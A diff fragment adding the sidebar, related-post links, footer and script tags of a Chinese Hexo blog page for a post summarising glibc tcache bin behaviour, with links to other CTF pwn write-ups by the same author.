class="toc-item toc-level-2"><a class="toc-link" href="#42-tcache-bin-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="toc-number">5.2.</span> <span class="toc-text"> 4.2 tcache bin 的一些特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E4%B8%80"><span class="toc-number">5.2.1.</span> <span class="toc-text"> 特性一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-gyctf_2020_signin"><span class="toc-number">5.2.1.1.</span> <span class="toc-text"> 例题 gyctf_2020_signin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E4%BA%8C"><span class="toc-number">5.2.2.</span> <span class="toc-text"> 特性二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-hitcon_2018_children_tcache"><span class="toc-number">5.2.2.1.</span> <span class="toc-text"> 例题 hitcon_2018_children_tcache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E6%89%93tcache_perthread_struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">5.3.</span> <span class="toc-text"> 4.3 打 tcache_perthread_struct 结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-tcache-bin-%E4%B8%8B%E6%A0%87"><span class="toc-number">5.4.</span> <span class="toc-text"> 4.4 tcache bin 下标</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2021/08/20/string/" rel="bookmark" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></li><li><a href="/2021/09/03/babyrop/" rel="bookmark" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></li><li><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="bookmark" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></li><li><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" rel="bookmark" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></li><li><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="bookmark" title="电科新生赛">电科新生赛</a></li><li><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" rel="bookmark" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></li><li><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" rel="bookmark" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></li><li><a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" rel="bookmark" title="利用realloc调整栈使one_gadget生效">利用realloc调整栈使one_gadget生效</a></li><li class="active"><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" rel="bookmark" title="Tcachebin 总结">Tcachebin 总结</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="invincible"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">invincible</p>
+  <div class="description" itemprop="description">凌恒山其若陋兮、</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">11</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="/default/" rel="section"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="堆学习-Chunk Overlapping">堆学习-Chunk Overlapping</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="标准64位程序ROP流程和堆栈平衡">标准64位程序ROP流程和堆栈平衡</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/02/02/%E5%88%A9%E7%94%A8realloc%E8%B0%83%E6%95%B4%E6%A0%88%E4%BD%BFone_gadget%E7%94%9F%E6%95%88/" title="利用realloc调整栈使one_gadget生效">利用realloc调整栈使one_gadget生效</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcher环境配置和ubuntu更新换源问题">LibcSearcher环境配置和ubuntu更新换源问题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/29/SCU%E6%96%B0%E7%94%9F%E8%B5%9B2021/" title="SCU新生赛2021 pwn wp">SCU新生赛2021 pwn wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="分类于 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="堆学习-UAF">堆学习-UAF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/08/20/string/" title="攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解">攻防世界string wp 以及个人对格式化字符漏洞偏移量的一些理解</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="电科新生赛">电科新生赛</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/09/03/babyrop/" title="标准32位程序ROP流程和c语言转义字符">标准32位程序ROP流程和c语言转义字符</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="分类于 CTF">CTF</a>
+</div>
+
+    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="格式化字符串漏洞进阶">格式化字符串漏洞进阶</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">invincible @ Nirvana</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/03/13/Tcache bin总结/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
